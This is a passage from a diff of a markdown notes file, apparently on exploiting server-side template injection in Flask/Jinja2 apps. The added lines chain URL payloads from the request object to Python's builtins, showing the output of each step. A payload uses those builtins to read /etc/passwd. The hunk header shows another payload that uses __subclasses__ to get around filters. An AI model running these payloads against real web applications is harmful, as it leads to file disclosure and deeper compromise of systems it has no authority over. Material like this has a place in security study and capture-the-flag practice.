@@ -57,11 +57,20 @@ http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f
 
 - Read a local file
 
+```http://127.0.0.1:5000/?c={{%20request.__class__}}``` : ```<class 'flask.wrappers.Request'>```
+
+```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data}}``` : ```<function Request._load_form_data at 0x7facac724680>```
+
+```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__}}``` : ```{'__name__': 'flask.wrappers', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facac720f90>...```
+
+```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__}}``` : ```{'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python...```
 
 PAYLOAD:
 ```
 http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}
 ```
+![image](https://github.com/poorvi1910/Web/assets/146640913/dba77ed3-b558-41bc-8740-12d3d668d256)
+
 
 - Run a command
 
